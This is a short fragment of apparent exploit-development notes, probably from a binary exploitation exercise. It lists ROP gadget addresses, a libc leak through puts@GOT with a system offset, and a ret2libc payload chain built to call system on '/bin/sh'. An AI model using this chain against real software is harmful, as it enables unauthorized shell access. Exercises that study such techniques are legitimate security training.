output
0x000000000040123e : pop rdi ; ret
0x0000000000402a33 : pop rsi ; ret
Libc leak: puts@GOT=0x601028 → system offset 0x45390
Payload: [padding] + leak_gadget + pop_rdi + binsh_addr + system
